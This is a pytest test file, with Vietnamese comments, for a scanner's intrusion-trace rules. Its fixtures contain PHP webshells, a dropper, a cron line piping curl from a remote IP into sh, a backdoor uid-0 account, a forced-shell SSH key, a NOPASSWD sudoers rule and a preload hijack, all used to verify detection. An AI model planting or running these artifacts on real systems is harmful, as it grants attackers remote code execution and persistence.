"""Truy vết xâm nhập: mọi rule phải bắn, và không rule nào được bắn sai chỗ.

Bộ dò này nguy hiểm hơn mọi bộ dò khác trong repo nếu nó kêu oan. Một phát
hiện injection sai chỉ tốn của người đọc vài phút; một phát hiện FSB-IR sai
nói rằng hệ thống ĐANG nằm trong tay người khác, và nó khởi động cả một quy
trình ứng cứu: ngắt dịch vụ, đổi toàn bộ khoá, gọi người trực đêm. Nên nửa
sau tệp này -- phần chứng minh bộ dò IM LẶNG -- quan trọng không kém nửa đầu.

Mẫu dựng bằng tmp_path chứ không nằm trong tests/samples, vì phần lớn kết
luận ở đây phụ thuộc vào ĐƯỜNG DẪN ( thư mục tải lên, cron.d, .ssh ), mà
corpus mẫu thì nằm ở một đường dẫn cố định không mô phỏng được những chỗ đó.
"""

from __future__ import annotations

from pathlib import Path
from typing import Dict, List, Set

import pytest

from fortress_scan.analysis.ir import persistence, scrub
from fortress_scan.core.config import Config
from fortress_scan.core.engine import scan
from fortress_scan.core.model import Severity
from fortress_scan.core.registry import all_rules
from fortress_scan.languages import PHP, PYTHON, SHELL


def _tree(root: Path, files: Dict[str, str]) -> Path:
    for relative, text in files.items():
        target = root / relative
        target.parent.mkdir(parents=True, exist_ok=True)
        target.write_text(text, encoding="utf-8")
    return root


def _ir_ids(root: Path) -> Set[str]:
    result = scan(str(root), Config(min_severity=Severity.INFO))
    return {f.rule_id for f in result.findings if f.rule_id.startswith("FSB-IR-")}


def _ir_findings(root: Path) -> List:
    result = scan(str(root), Config(min_severity=Severity.INFO))
    return [f for f in result.findings if f.rule_id.startswith("FSB-IR-")]


# --- Mỗi rule bắn trên một hiện vật thật ---------------------------------

WEBSHELL_OBFUSCATED = "<?php\n@error_reporting(0);\n$c = $_POST['c'];\neval(base64_decode($c));\n"
WEBSHELL_PLAIN = "<?php\n$c = $_REQUEST['c'];\nsystem($c);\n"
DROPPER = "<?php\neval(gzinflate(base64_decode('S0mtKC4pAgA=')));\n"
AUTH_GATE = (
    "<?php\n"
    "if (md5($_POST['p']) === '21232f297a57a5a743894a0e4a801fc3') {\n"
    "    system($_POST['cmd']);\n"
    "}\n"
)

FIRES: Dict[str, Dict[str, str]] = {
    "FSB-IR-001": {"uploads/avatar.php": WEBSHELL_OBFUSCATED},
    "FSB-IR-002": {"lib/stage.php": DROPPER},
    "FSB-IR-003": {"lib/gate.php": AUTH_GATE},
    "FSB-IR-010": {
        "etc/cron.d/sync": "*/5 * * * * root curl -s http://198.51.100.7/a.sh | sh\n"
    },
    "FSB-IR-011": {
        "etc/systemd/system/helper.service": "[Service]\nExecStart=/tmp/.cache/helper\n"
    },
    "FSB-IR-012": {
        "home/app/.bashrc": "echo aWQK | base64 -d | sh\n",
    },
    "FSB-IR-013": {"etc/ld.so.preload": "/lib/x86_64-linux-gnu/libnet.so\n"},
    "FSB-IR-014": {
        "root/.ssh/authorized_keys": 'command="/bin/bash -i" ssh-rsa AAAAB3Nza ke\n'
    },
    "FSB-IR-015": {
        "etc/passwd": "root:x:0:0:root:/root:/bin/bash\nsysmon:x:0:0::/home/s:/bin/bash\n"
    },
    "FSB-IR-016": {"etc/sudoers.d/90-app": "app ALL=(ALL) NOPASSWD: ALL\n"},
    "FSB-IR-017": {"uploads/.htaccess": "AddHandler application/x-httpd-php .php .jpg\n"},
}


@pytest.mark.parametrize("rule_id", sorted(FIRES))
def test_rule_fires_on_its_artifact(rule_id: str, tmp_path: Path) -> None:
    found = _ir_ids(_tree(tmp_path, FIRES[rule_id]))
    assert rule_id in found, "%s không kích hoạt; nhận được: %s" % (rule_id, sorted(found))


def test_every_ir_rule_has_a_case_here() -> None:
    """Thêm một rule FSB-IR mà quên mẫu thì bài này đỏ, không phải người review."""
    registered = {rule.id for rule in all_rules() if rule.id.startswith("FSB-IR-")}
    assert registered - set(FIRES) == set()


# --- Quyết định thiết kế: nguồn tới sink MỘT MÌNH thì im lặng ------------


def test_plain_injection_in_an_application_file_is_not_called_a_compromise(
    tmp_path: Path,
) -> None:
    """Chỗ này là ranh giới giữa hai câu hỏi, và nó phải được khoá lại.

    `eval($_POST[...])` trong một controller thật là một LỖ HỔNG, và họ
    FSB-EXEC bắt nó. Gọi nó là webshell nghĩa là báo rằng đã có người đột
    nhập, và trong một ca ứng cứu thì câu đó đẩy cả đội đi truy một vụ không
    có thật.
    """
    root = _tree(
        tmp_path,
        {
            "src/Http/Controller.php": (
                "<?php\n"
                "namespace App\\Http;\n"
                "class Controller {\n"
                "    public function run() {\n"
                "        system($_POST['cmd']);\n"
                "    }\n"
                "}\n"
            )
        },
    )
    result = scan(str(root), Config(min_severity=Severity.INFO))
    ids = {f.rule_id for f in result.findings}
    assert not {i for i in ids if i.startswith("FSB-IR-")}
    assert ids, "rule injection vẫn phải bắn ở đây"


def test_upload_directory_alone_without_a_sink_stays_silent(tmp_path: Path) -> None:
    root = _tree(tmp_path, {"uploads/notes.php": "<?php\necho $_GET['name'];\n"})
    assert _ir_ids(root) == set()


# --- Nhắc tới dấu hiệu khác với gọi dấu hiệu -----------------------------


def test_a_file_that_merely_names_the_markers_is_not_a_webshell(tmp_path: Path) -> None:
    """Đúng lớp báo nhầm đã xảy ra thật: bản đầu của bộ dò bắn vào chính nó.

    Một bảng quy tắc, một luật YARA, một tệp tài liệu về webshell đều chứa
    `eval(` và `$_POST` dưới dạng CHUỖI. Bộ dò chỉ được kết luận khi sink là
    mã thật.
    """
    root = _tree(
        tmp_path,
        {
            "rules/php_rules.py": (
                '"""Bảng dấu hiệu webshell PHP."""\n'
                "SINKS = ('eval(', 'system(', 'shell_exec(')\n"
                "INPUTS = ('$_POST', '$_GET', '$_REQUEST')\n"
                "DECODERS = ('base64_decode(', 'gzinflate(')\n"
            ),
            "docs/webshell.php": (
                "<?php\n"
                "// Ví dụ trong tài liệu: eval(base64_decode($_POST['c']));\n"
                "/* $_REQUEST['c'] chạy tới system() là hình dạng cần tránh */\n"
                "return 0;\n"
            ),
        },
    )
    assert _ir_ids(root) == set()


def test_vendored_and_generated_code_is_never_called_planted(tmp_path: Path) -> None:
    root = _tree(
        tmp_path,
        {
            "vendor/pkg/shell.php": WEBSHELL_OBFUSCATED,
            "uploads/generated/bundle.min.php": WEBSHELL_OBFUSCATED,
        },
    )
    assert _ir_ids(root) == set()


def test_a_large_application_file_is_out_of_scope_for_the_webshell_model(
    tmp_path: Path,
) -> None:
    body = "".join("$x%d = %d;\n" % (i, i) for i in range(persistence.MAX_LINES))
    root = _tree(tmp_path, {"uploads/big.php": WEBSHELL_OBFUSCATED + body})
    assert "FSB-IR-001" not in _ir_ids(root)


# --- Hiện vật: chú thích, dòng sạch, và chặn trên ------------------------


def test_comments_in_an_artifact_are_not_commands(tmp_path: Path) -> None:
    root = _tree(
        tmp_path,
        {
            "etc/cron.d/notes": (
                "# */5 * * * * root curl -s http://198.51.100.7/a.sh | sh\n"
                "0 3 * * * root /usr/local/bin/backup.sh\n"
            )
        },
    )
    assert _ir_ids(root) == set()


def test_a_benign_artifact_set_is_silent(tmp_path: Path) -> None:
    root = _tree(
        tmp_path,
        {
            "etc/cron.d/backup": "0 3 * * * root /usr/local/bin/backup.sh --quiet\n",
            "etc/systemd/system/api.service": (
                "[Unit]\nDescription=API\n\n[Service]\n"
                "ExecStart=/usr/local/bin/api --port 8080\n"
                "WorkingDirectory=/srv/api\n"
            ),
            "root/.ssh/authorized_keys": "ssh-ed25519 AAAAC3NzaC1lZDI1 deploy@ci\n",
            "etc/passwd": "root:x:0:0:root:/root:/bin/bash\napp:x:1000:1000::/home/app:/bin/sh\n",
            "etc/sudoers.d/10-app": "app ALL=(root) /usr/bin/systemctl restart api\n",
            "home/app/.bashrc": "export PATH=/usr/local/bin:$PATH\nalias ll='ls -la'\n",
            "etc/ld.so.preload": "# khong nap gi\n",
        },
    )
    assert _ir_ids(root) == set()


def test_systemd_only_reads_exec_directives(tmp_path: Path) -> None:
    """`/tmp` trong WorkingDirectory không phải lệnh được chạy."""
    root = _tree(
        tmp_path,
        {
            "etc/systemd/system/a.service": (
                "[Service]\nWorkingDirectory=/tmp/build\n"
                "ExecStart=/usr/local/bin/api\n"
            )
        },
    )
    assert _ir_ids(root) == set()


def test_a_hostile_artifact_cannot_inflate_the_report(tmp_path: Path) -> None:
    line = "*/5 * * * * root curl -s http://198.51.100.7/a.sh | sh\n"
    root = _tree(tmp_path, {"etc/cron.d/flood": line * 500})
    hits = [f for f in _ir_findings(root) if f.rule_id == "FSB-IR-010"]
    assert 0 < len(hits) <= persistence.MAX_REPORTS_PER_RULE


# --- Vị trí báo ra phải trỏ đúng dòng -----------------------------------


def test_reported_line_points_at_the_real_line(tmp_path: Path) -> None:
    root = _tree(
        tmp_path,
        {
            "etc/cron.d/mixed": (
                "# chu thich\n"
                "0 3 * * * root /usr/local/bin/backup.sh\n"
                "\n"
                "*/5 * * * * root curl -s http://198.51.100.7/a.sh | sh\n"
            )
        },
    )
    hits = [f for f in _ir_findings(root) if f.rule_id == "FSB-IR-010"]
    assert [f.line for f in hits] == [4]


def test_webshell_is_anchored_at_the_execution_line(tmp_path: Path) -> None:
    root = _tree(tmp_path, {"uploads/x.php": WEBSHELL_OBFUSCATED})
    hits = [f for f in _ir_findings(root) if f.rule_id == "FSB-IR-001"]
    assert len(hits) == 1
    assert hits[0].line == 4
    source_lines = [step.line for step in hits[0].trace if step.kind.value == "source"]
    assert source_lines == [3]


def test_every_finding_carries_evidence_and_a_remediation(tmp_path: Path) -> None:
    root = _tree(tmp_path, dict(item for case in FIRES.values() for item in case.items()))
    findings = _ir_findings(root)
    assert findings
    for finding in findings:
        assert finding.evidence, finding.rule_id
        assert finding.remediation, finding.rule_id
        assert "ir" in finding.tags, finding.rule_id


# --- Phép nhận loại hiện vật --------------------------------------------


@pytest.mark.parametrize(
    "relative,expected",
    [
        ("etc/crontab", persistence.CRON),
        ("etc/cron.d/task", persistence.CRON),
        ("etc/cron.daily/logrotate", persistence.CRON),
        ("etc/systemd/system/a.service", persistence.SYSTEMD),
        ("usr/lib/systemd/system/b.timer", persistence.SYSTEMD),
        ("home/u/.bashrc", persistence.SHELL_RC),
        ("etc/profile.d/custom.sh", persistence.SHELL_RC),
        ("home/u/.ssh/authorized_keys", persistence.AUTHORIZED_KEYS),
        ("etc/ld.so.preload", persistence.PRELOAD),
        ("etc/nginx/sites-enabled/default", persistence.WEB_CONFIG),
        ("var/www/uploads/.htaccess", persistence.WEB_CONFIG),
        ("etc/sudoers", persistence.SUDOERS),
        ("etc/sudoers.d/90-app", persistence.SUDOERS),
        ("etc/passwd", persistence.ACCOUNTS),
        ("etc/init.d/apache2", persistence.INIT_SCRIPT),
        ("src/app/main.py", None),
        ("README.md", None),
        (".gitignore", None),
        (".editorconfig", None),
    ],
)
def test_artifact_kind_detection(relative: str, expected) -> None:
    assert persistence.kind_of(relative) == expected


# --- Bộ xóa chuỗi và chú thích ------------------------------------------


@pytest.mark.parametrize(
    "language,source,gone,kept",
    [
        (PHP, "<?php\n$a = 'eval(';\nsystem($x);\n", "eval(", "system("),
        (PHP, "<?php\n// eval($_POST[1]);\nsystem($x);\n", "eval(", "system("),
        (PHP, "<?php\n/* eval(1) */\nsystem($x);\n", "eval(1)", "system("),
        (PYTHON, '"""eval(x)"""\nos.system(y)\n', "eval(x)", "os.system("),
        (PYTHON, "# eval(x)\nos.system(y)\n", "eval(x)", "os.system("),
        (SHELL, "# eval $x\nsystem_call\n", "eval $x", "system_call"),
    ],
)
def test_scrub_removes_mentions_and_keeps_code(
    language: str, source: str, gone: str, kept: str
) -> None:
    cleaned = scrub.scrub(source, language)
    assert gone not in cleaned
    assert kept in cleaned


@pytest.mark.parametrize(
    "language,source",
    [
        (PHP, "<?php\n$a = 'chua dong\nsystem($x);\n"),
        (PYTHON, "a = '''chua dong\nos.system(y)\n"),
        (PYTHON, "a = 'le\n"),
        (SHELL, "echo 'le\n"),
        (PHP, "<?php\n/* chua dong\n"),
    ],
)
def test_scrub_preserves_length_on_unbalanced_input(language: str, source: str) -> None:
    """Giữ độ dài là điều kiện để vị trí báo ra còn đúng, kể cả trên nháy lệch."""
    assert len(scrub.scrub(source, language)) == len(source)


def test_scrub_keeps_line_numbers_across_a_multiline_literal() -> None:
    source = 'x = """\n\n\n"""\nos.system(y)\n'
    cleaned = scrub.scrub(source, PYTHON)
    assert cleaned.count("\n") == source.count("\n")
    assert cleaned.splitlines()[4].strip() == "os.system(y)"


def test_scrub_leaves_backticks_alone_in_shell() -> None:
    """Backtick của shell là lệnh, không phải chuỗi; xóa nó là tự gỡ mất sink."""
    source = "x=`curl http://h/a`\n"
    assert scrub.scrub(source, SHELL) == source


def test_scrub_returns_the_source_for_unknown_languages() -> None:
    source = "anything 'quoted' # comment\n"
    assert scrub.scrub(source, "khong-biet") == source


# --- Bộ xóa phải tuyến tính trên đầu vào thù địch ------------------------

# Cùng lý do với tests/test_regex_complexity.py: bộ xóa này chạy trên MỌI tệp
# của mọi lượt quét, nên một hình dạng bậc hai trong nó là lỗ hổng từ chối
# dịch vụ mà kẻ tấn công kích hoạt bằng cách nhờ nạn nhân quét repo của mình.
#
# Bản đầu duyệt từng ký tự: tuyến tính nhưng tốn 117 micro giây mỗi KB. Bản
# sau nhảy theo `str.find` và nhớ vị trí kế tiếp của từng token. Phép nhớ đó
# chính là thứ giữ cho chi phí tuyến tính, và nếu ai bỏ nó đi thì mỗi chuỗi
# sẽ kéo cả bộ token quét lại từ đầu -- đúng hình dạng bài này canh.
_SCRUB_SMALL = 8_000
_SCRUB_LARGE = 256_000

# Trần tuyệt đối đặt cao hơn của test_regex_complexity.py ( 1,0 giây ) là có
# lý do đo được, không phải nới tay: các mẫu regex ở đó chạy trong C với
# 10-25 nanô giây mỗi ký tự, còn bộ xóa này là một vòng lặp Python và đo được
# khoảng 460 nanô giây mỗi ký tự ở hình dạng xấu nhất -- 117 mili giây cho
# 256 nghìn ký tự trên máy dựng bản này. Runner Windows và macOS chậm hơn vài
# lần, nên trần 1,0 giây sẽ đỏ ngẫu nhiên, và một bài đo đỏ ngẫu nhiên thì cả
# đội học cách chạy lại cho tới khi nó xanh. Trần 3,0 giây vẫn cách một lỗi
# bậc hai hai bậc độ lớn: ở cỡ này bậc hai tốn hàng phút.
_SCRUB_MAX_SECONDS = 3.0

# Cỡ nhỏ 8 nghìn chứ không 2 nghìn: ở 2 nghìn ký tự phép đo rơi xuống dưới sàn
# nhiễu, phép so tỉ lệ bị bỏ qua, và bài kiểm tra chỉ còn lại một nửa mà không
# ai biết. Tỉ lệ cỡ là 32, nên tuyến tính cho khoảng 32 còn bậc hai cho khoảng
# 1.024; hệ số 4 nằm gọn giữa hai lớp.
_SCRUB_MAX_SCALE = (_SCRUB_LARGE / _SCRUB_SMALL) * 4
_SCRUB_NOISE_FLOOR = 1e-3

_HOSTILE_SHAPES: Dict[str, str] = {
    "nhay-khong-dong": "'",
    "nhay-kep-khong-dong": '"',
    "mo-khoi-khong-dong": "/*",
    "nhay-ba": '"""',
    "chu-thich": "#",
    "chu-thich-c": "//",
    "nhay-xen-ke": "'\"",
    "thoat": "\\'",
    "nhay-mot-dong": "''",
    "xuong-dong": "'\n",
}


def _scrub_seconds(language: str, text: str) -> float:
    import time

    best = None
    for _ in range(3):
        start = time.perf_counter()
        scrub.scrub(text, language)
        elapsed = time.perf_counter() - start
        if best is None or elapsed < best:
            best = elapsed
    return best or 0.0


@pytest.mark.parametrize("shape", sorted(_HOSTILE_SHAPES))
@pytest.mark.parametrize("language", [PHP, PYTHON, SHELL])
def test_scrub_stays_linear_on_hostile_input(language: str, shape: str) -> None:
    unit = _HOSTILE_SHAPES[shape]
    small = unit * (_SCRUB_SMALL // len(unit))
    large = unit * (_SCRUB_LARGE // len(unit))

    large_seconds = _scrub_seconds(language, large)
    assert large_seconds < _SCRUB_MAX_SECONDS, "%s/%s: %.3fs cho %d ky tu" % (
        language,
        shape,
        large_seconds,
        len(large),
    )

    small_seconds = _scrub_seconds(language, small)
    if small_seconds < _SCRUB_NOISE_FLOOR:
        return
    scale = large_seconds / small_seconds
    assert scale < _SCRUB_MAX_SCALE, "%s/%s: ty le %.0f vuot nguong %.0f" % (
        language,
        shape,
        scale,
        _SCRUB_MAX_SCALE,
    )
